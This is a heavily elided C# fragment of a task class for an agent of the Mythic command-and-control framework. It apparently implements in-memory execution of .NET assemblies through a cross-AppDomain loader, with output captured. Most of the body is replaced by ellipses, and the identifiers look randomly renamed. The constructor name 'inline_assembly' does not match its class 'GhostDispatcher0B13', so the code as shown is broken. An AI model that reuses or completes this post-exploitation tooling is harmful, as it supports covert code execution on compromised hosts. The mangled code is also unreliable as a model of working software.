...
namespace Tasks
{
    public class GhostDispatcher0B13 : Tasking
    {
        [DataContract]
        internal struct OptimizedManager135C
        {
        ...
        public inline_assembly(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            ...
            _sendAction = o =>
            {
                ...
                while (!_completed && !_cancellationToken.IsCancellationRequested)
                {
                    ...
                    if (!ValidationHelper.IsStringEmpty(slicedOut))
                    {
        ...
        public override void Start()
        {
            ...
            try
            {
                ...
                if (interopBytes.Length != 0)
                {
                    ...
                    {
                        string[] stringData = ValidationHelper.IsStringEmpty(parameters.AssemblyArguments)
                            ? new string[0]
        ...
        private static void ShadowGatewayC083(AppDomain oDomain)
        {
...
#region Cross AppDomain Loader
        static void ActivateLoader()
        {
            void OnWrite(object sender, object args)
            {
                ...
                if (!ValidationHelper.IsStringEmpty(data))
                {
                    _output += data;
                }
            }
